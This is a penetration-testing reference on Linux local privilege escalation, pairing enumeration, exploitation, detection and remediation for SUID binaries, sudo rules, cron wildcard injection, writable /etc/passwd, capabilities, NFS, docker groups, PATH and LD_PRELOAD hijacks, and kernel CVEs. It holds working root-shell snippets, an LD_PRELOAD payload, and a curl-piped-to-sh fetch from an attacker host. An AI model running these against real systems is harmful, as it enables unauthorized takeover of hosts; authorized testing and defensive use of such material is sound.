# Linux Local Privilege Escalation — Reference

Low-priv user → root on a standalone Linux host. **Enumerate first, prefer
misconfiguration paths, prove with `id`, then stop.** Kernel/component memory-corruption
exploits are **DETECT-ONLY** unless RoE names a lab/non-prod host (they can crash or
brick the box). GTFOBins (<https://gtfobins.github.io>) is the master lookup for SUID,
sudo, and capability abuse — check every unusual binary there first.

---

## 0. Enumeration

### HOW TO FIND — quick manual triage (do this first)
```bash
id; whoami; groups                              # current privileges & group membership
sudo -l 2>/dev/null                             # what may I run as root/others? (often the win)
uname -a; cat /etc/os-release                   # kernel + distro (feeds exploit-suggester)
find / -perm -4000 -type f 2>/dev/null          # SUID binaries
find / -perm -2000 -type f 2>/dev/null          # SGID binaries
getcap -r / 2>/dev/null                          # file capabilities
cat /etc/crontab; ls -la /etc/cron.*             # cron jobs (writable scripts?)
ls -la /etc/passwd /etc/shadow                   # writable? world-readable shadow?
echo $PATH                                       # weak/relative PATH entries?
ps aux --forest                                  # processes running as root
mount; cat /etc/fstab; showmount -e localhost 2>/dev/null   # NFS/mounts
env                                              # LD_* / interesting vars
```

### HOW TO FIND — automated coverage (read the output, don't auto-run its exploits)
```bash
# LinPEAS — comprehensive; serve from attack box, run from RAM, no writes to disk
curl -sL http://<ATTACKER>/linpeas.sh | sh 2>/dev/null | tee /dev/shm/lp.txt   # /dev/shm, not disk
# Alternatives
./LinEnum.sh -t                                   # classic enumerator
./linux-smart-enumeration/lse.sh -l1              # ranked findings
# Realtime — catch cron/root processes WITHOUT needing root (no procfs perms needed)
./pspy64                                          # watch scheduled/short-lived root commands
# Kernel-exploit candidate suggester (REPORT its hits, do not blindly run)
./linux-exploit-suggester.sh                      # or: perl les.pl -k $(uname -r)
```
- **Detection:** LinPEAS/pspy generate bursts of `find`/`getcap`/proc reads; downloads to
  `/dev/shm`. Remediation-side, monitor for mass SUID enumeration and `pspy`-style procfs
  polling.
- **Reference:** PEASS-ng, HackTricks "Linux Privilege Escalation" checklist (Sources).

---

## 1. SUID / SGID binaries + GTFOBins

**HOW TO FIND**
```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```
Compare the list against a stock system; anything non-standard (`find`, `nmap`, `vim`,
`python`, `env`, `cp`, `bash`, `less`, `awk`, `tar`, custom binaries) is a candidate.

**HOW TO EXPLOIT (safe, deterministic)** — look the binary up on GTFOBins under the
**SUID** section and run its exact snippet. Examples:
```bash
# find with SUID bit → run a command as the file owner (root)
find . -exec /bin/sh -p \; -quit          # -p preserves euid; you get a root shell
# GNU cp/vim/less/awk/env etc. each have a GTFOBins SUID recipe
# env with SUID:
./env /bin/sh -p
```
Prove with `id` (expect `euid=0(root)`), then exit. Do not modify system files.

- **Reference:** GTFOBins (per-binary SUID entries).
- **Detection:** SUID binary spawning `/bin/sh -p`; unexpected root-euid child of a
  non-login binary. Auditd `execve` with `euid=0` from a SUID exec.
- **Remediation:** remove SUID bit (`chmod u-s`) from binaries that don't need it; never
  set SUID on interpreters/shells/text tools; use capabilities or sudo rules scoped
  tightly instead.

---

## 2. sudo misconfiguration (`sudo -l` + GTFOBins)

**HOW TO FIND**
```bash
sudo -l                # enumerate permitted commands (may need the user's password)
sudo -V | head -1      # sudo VERSION → check against sudo CVEs
```

**HOW TO EXPLOIT (safe)**
- **NOPASSWD / allowed binary → GTFOBins "Sudo" section.** e.g. if you may
  `sudo vim`, `sudo less`, `sudo find`, `sudo awk`, `sudo python`, `sudo tar`, etc.:
  ```bash
  sudo find . -exec /bin/sh \; -quit        # root shell
  sudo awk 'BEGIN{system("/bin/sh")}'
  sudo vim -c ':!/bin/sh'
  ```
- **`env_keep`/`LD_PRELOAD` retained** (see §9) → hijack a library into a sudo-run binary.
- **`sudo -l` shows a wildcard or a script you can write** → tamper with the target.
- **Sudo version CVEs (fingerprint, then validate carefully):**
  - **CVE-2021-3156 (Baron Samedit)** — heap overflow in `sudoedit`, affects sudo
    < 1.9.5p2. Reliable public PoCs, but it is **memory-corruption → treat as
    DETECT-ONLY** on prod (mark the version as the finding); run only in lab/RoE.
  - **CVE-2019-14287** — `sudo … -u#-1` runbook bypass when a user may run as `ALL,
    !root`; safe to demonstrate: `sudo -u#-1 id` → runs as root. Fingerprint sudoers
    for the vulnerable pattern.
  - **CVE-2023-22809 (sudoedit `--` arg injection via EDITOR)** — safe to demonstrate by
    editing an out-of-policy file; affects sudo 1.8.0–1.9.12p1.

- **Reference:** GTFOBins Sudo entries; NVD for the sudo CVEs; Qualys advisories.
- **Detection:** `sudo` invoking shells/interpreters; sudoedit anomalies; sudo version
  in inventory vs. patched baseline.
- **Remediation:** patch sudo; remove `NOPASSWD` where possible; never grant sudo on
  interpreters/pagers/editors/archive tools; drop `env_keep` for `LD_*`; use
  `Defaults!<cmd> noexec` and full paths in sudoers.

---

## 3. cron jobs, wildcard injection & PATH abuse

**HOW TO FIND**
```bash
cat /etc/crontab; ls -la /etc/cron.* /etc/cron.d/ /var/spool/cron/ 2>/dev/null
./pspy64                       # catch cron & other root-run commands, incl. their args
```
Look for: a root cron that runs a **world-writable script**, a script that uses a
**relative binary name** (PATH abuse), or one that runs `tar`/`chown`/`chmod`/`rsync`
over a **directory you can write** (wildcard injection).

**HOW TO EXPLOIT (safe)**
- **Writable script run by root cron:** append a benign proof line (e.g. copy a shell to
  a marker path and set SUID) — record and remove it after proving.
- **Relative-path binary in a root cron + writable PATH dir:** drop a script named after
  the binary earlier in PATH.
- **Wildcard injection** (root runs `tar -cf backup.tar *` in a dir you control):
  ```bash
  # In the target dir, create argument-like filenames tar will interpret
  echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh
  touch -- '--checkpoint=1'
  touch -- '--checkpoint-action=exec=sh runme.sh'
  # When root's cron runs `tar ... *`, it executes runme.sh. Prove with /tmp/rootbash -p; then clean up.
  ```
- **Reference:** HackTricks "Cron/Wildcards"; GTFOBins (tar/rsync).
- **Detection:** cron child processes spawning shells; new SUID files under `/tmp`;
  filenames beginning with `--`.
- **Remediation:** root cron scripts owned by root & non-writable; absolute paths and a
  fixed PATH in cron; never glob untrusted dirs; use `--` / `./` guards.

---

## 4. Writable `/etc/passwd` (and readable `/etc/shadow`)

**HOW TO FIND**
```bash
ls -la /etc/passwd /etc/shadow
```

**HOW TO EXPLOIT (safe, reversible — snapshot first)**
- **Writable `/etc/passwd`:** add a root-uid entry with a known password hash. Keep a
  backup and restore it after proving.
  ```bash
  cp /etc/passwd /tmp/passwd.bak                      # backup for cleanup
  openssl passwd -1 -salt aa Passw0rd                 # -> $1$aa$... hash
  echo 'pentest:$1$aa$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
  su pentest                                          # id -> uid=0; then:
  # cp /tmp/passwd.bak /etc/passwd   (restore, remove marker line)
  ```
- **World-readable `/etc/shadow`:** copy the hashes, crack offline (see
  `password-cracking-credentials`) — do **not** overwrite shadow.
- **Reference:** HackTricks "Writable /etc/passwd".
- **Detection:** modifications to `/etc/passwd`/`/etc/shadow` (auditd `-w /etc/passwd`);
  new uid-0 accounts.
- **Remediation:** correct ownership/perms (`root:root 644` passwd, `640/000` shadow);
  file-integrity monitoring on `/etc/`.

---

## 5. Linux capabilities

**HOW TO FIND**
```bash
getcap -r / 2>/dev/null
```
Dangerous ones: `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_dac_read_search`,
`cap_sys_admin`, `cap_sys_ptrace`, `cap_chown` on a general-purpose binary.

**HOW TO EXPLOIT (safe)** — GTFOBins "Capabilities" section per binary. e.g.:
```bash
# python with cap_setuid+ep:
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
# perl with cap_setuid: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
Prove with `id`, exit.
- **Reference:** GTFOBins Capabilities; `man 7 capabilities`.
- **Detection:** capability-bearing interpreter spawning root shell.
- **Remediation:** remove caps (`setcap -r <file>`); never put `cap_setuid`/`cap_sys_admin`
  on interpreters; grant the minimum capability to a purpose-built helper only.

---

## 6. NFS `no_root_squash`

**HOW TO FIND**
```bash
cat /etc/exports 2>/dev/null                 # on the server
showmount -e <NFS_SERVER>                     # from a client you control (in scope)
# look for an export with (rw,no_root_squash)
```
`no_root_squash` means remote root is treated as local root on the export.

**HOW TO EXPLOIT (safe, from a box where you are root, e.g. your own attack VM in scope)**
```bash
mkdir /mnt/nfs && mount -o rw,vers=3 <NFS_SERVER>:/export /mnt/nfs
# As root on the client, drop a SUID root shell into the shared dir:
cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash
# On the TARGET (low-priv), run: /path/to/rootbash -p  -> euid 0. Prove with id, then:
rm /mnt/nfs/rootbash   # cleanup
```
- **Reference:** HackTricks "NFS no_root_squash".
- **Detection:** SUID binaries appearing on NFS-exported paths; mounts from unexpected
  clients.
- **Remediation:** use `root_squash` (default), `all_squash` where possible, `nosuid` on
  exports, restrict export hosts, prefer Kerberized NFS (`sec=krb5`).

---

## 7. Dangerous group membership — docker / lxd / disk

**HOW TO FIND**
```bash
id            # docker, lxd/lxc, disk, adm, video, sudo groups?
```

**HOW TO EXPLOIT (safe proof; docker/lxd = effectively root via container)**
- **`docker` group** — you can mount the host root into a container:
  ```bash
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh    # root on host FS; prove with id, exit
  ```
  (This is the light version of container escape — see `container-supply-chain-security`.)
- **`lxd`/`lxc` group** — import a small image and launch a privileged container mounting
  host root (`security.privileged=true`, `disk` device path `/`), then read/write host.
  Prove minimally; do not persist. See HackTricks "lxd privesc".
- **`disk` group** — raw read of block devices with `debugfs /dev/sda1` → read
  `/etc/shadow` (do not write to the raw device — corruption risk = DoS).
- **Reference:** HackTricks "Interesting Groups"; GTFOBins.
- **Detection:** non-root users launching containers with host-root bind mounts;
  `debugfs` on system disks.
- **Remediation:** treat docker/lxd group membership as equivalent to root — grant
  sparingly; use rootless Docker; audit `disk`/`adm` membership.

---

## 8. PATH hijack (root-run script/binary with relative call)

**HOW TO FIND** — a SUID binary or root cron/service that calls another program by
**name** (not absolute path). `strings <suid_binary> | grep -E '^(ls|cat|cp|service|…)$'`
or watch with `pspy`.

**HOW TO EXPLOIT (safe)**
```bash
# If root context calls e.g. `service` by name and you can prepend a writable dir to PATH:
echo -e '#!/bin/sh\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/hj/service
chmod +x /tmp/hj/service
export PATH=/tmp/hj:$PATH        # then trigger the root binary; prove, then clean up
```
- **Reference:** HackTricks "PATH abuse".
- **Detection:** root processes executing binaries from user-writable dirs.
- **Remediation:** absolute paths in privileged scripts/binaries; sanitized/fixed PATH;
  `secure_path` in sudoers.

---

## 9. LD_PRELOAD / LD_LIBRARY_PATH / shared-object hijack

**HOW TO FIND**
- `sudo -l` showing `env_keep+=LD_PRELOAD` (or `LD_LIBRARY_PATH`).
- A SUID/root binary that loads a library from a **writable** directory
  (`ldd <binary>`; missing/writable `.so`).

**HOW TO EXPLOIT (safe)**
```bash
# LD_PRELOAD retained through sudo:
cat > /tmp/pe.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/sh -p"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so <any-allowed-binary>   # -> root shell; prove with id, exit
rm /tmp/pe.so /tmp/pe.c                            # cleanup
```
For **`.so` hijack**, place a malicious library where a root binary will load it first
(writable RPATH/`LD_LIBRARY_PATH` dir). Keep the payload benign (spawn proof shell).
- **Reference:** HackTricks "LD_PRELOAD / LD_LIBRARY_PATH"; GTFOBins.
- **Detection:** SUID/sudo processes with `LD_PRELOAD`/`LD_LIBRARY_PATH` set; loading
  `.so` from writable paths.
- **Remediation:** the loader already ignores `LD_PRELOAD` for SUID unless kept — do not
  add `LD_*` to `env_keep`; fix RPATH; make library dirs root-owned/non-writable.

---

## 10. Kernel / component memory-corruption CVEs — **DETECT-ONLY by default**

For each: identify the vulnerable version → **that is the finding**. Only run the actual
exploit in a lab / on an RoE-approved non-prod, snapshotted host — these can crash or
render the system unbootable (DoS).

### PwnKit — CVE-2021-4034 (polkit `pkexec`)
- **HOW TO FIND:** `pkexec --version` (polkit `< 0.120` patched builds); presence of SUID
  `pkexec` (`ls -la /usr/bin/pkexec`). Affects essentially all polkit installs since 2009.
  A non-destructive check: run a PoC "check" mode, or verify the package version against
  the distro's fixed version.
- **HOW TO EXPLOIT:** public self-contained PoCs give an instant root shell; generally
  reliable and clean (memory-corruption but no file overwrite). Prefer detect-first;
  prove with `id`, exit. CVSS 7.8, **CISA KEV**.
- **Reference:** Qualys advisory; NVD CVE-2021-4034.
- **Detection:** `pkexec` execs with no args and `GCONV_PATH` set in env; auditd on
  `pkexec`. **Remediation:** `apt/yum update polkit`; interim `chmod 0755 /usr/bin/pkexec`
  (remove SUID).

### DirtyPipe — CVE-2022-0847 (kernel pipe buffers) — CRASH-PRONE
- **HOW TO FIND:** `uname -r` — vulnerable Linux **5.8 up to <5.16.11 / <5.15.25 /
  <5.10.102**. Fingerprint the kernel; do not run the overwrite on prod.
- **HOW TO EXPLOIT (lab/RoE only):** PoCs overwrite read-only files (e.g. inject into a
  SUID binary or edit `/etc/passwd`). The overwrite can corrupt the target file if not
  restored — restore from backup and clean up. Prove with `id`. CVSS 7.8, **CISA KEV**.
- **Reference:** Max Kellermann's writeup; NVD; JFrog analysis.
- **Detection:** unexpected writes to read-only/SUID files; EDR file-integrity alerts.
  **Remediation:** patch kernel to fixed point release.

### Dirty COW — CVE-2016-5195 (copy-on-write race) — CRASH-PRONE
- **HOW TO FIND:** older kernels (< 4.8.3 range; many distro backports). `uname -r` +
  distro advisory mapping.
- **HOW TO EXPLOIT (lab/RoE only):** race-condition PoCs (e.g. modify a SUID or
  `/etc/passwd`); **notorious for hanging/destabilizing** the host — DETECT-ONLY on prod.
- **Reference:** dirtycow.ninja; NVD CVE-2016-5195. **Remediation:** patch kernel.

### Looney Tunables — CVE-2023-4911 (glibc `ld.so` GLIBC_TUNABLES) — CRASH-PRONE
- **HOW TO FIND:** `ldd --version` / glibc package version; affects default installs of
  major distros (glibc 2.34+ with the tunables parsing bug). Fingerprint version.
- **HOW TO EXPLOIT (lab/RoE only):** launch a SUID binary with a crafted `GLIBC_TUNABLES`
  buffer-overflow value. A bad run can leave glibc/loader unstable. Prove with `id`.
  CVSS 7.8, **CISA KEV**.
- **Reference:** Qualys advisory; NVD CVE-2023-4911.
- **Detection:** SUID execs with `GLIBC_TUNABLES` set. **Remediation:** update glibc.

### General kernel-exploit rule
`linux-exploit-suggester` output = a **prioritized list of CVEs to report**, not a to-run
list. Map each hit to NVD/KEV, fingerprint the version, and recommend patching. Run only
what RoE permits, in a lab, with a snapshot.

---

## Quick reference — GTFOBins usage

For any binary you control via SUID / sudo / capabilities, go to
`https://gtfoBins.github.io/gtfobins/<binary>/` and use the section matching your vector
(**SUID**, **Sudo**, or **Capabilities**). It is the single fastest, safest privesc
lookup on Linux. LOLBAS (`https://lolbas-project.github.io`) is the Windows equivalent —
see `windows-privesc.md`.
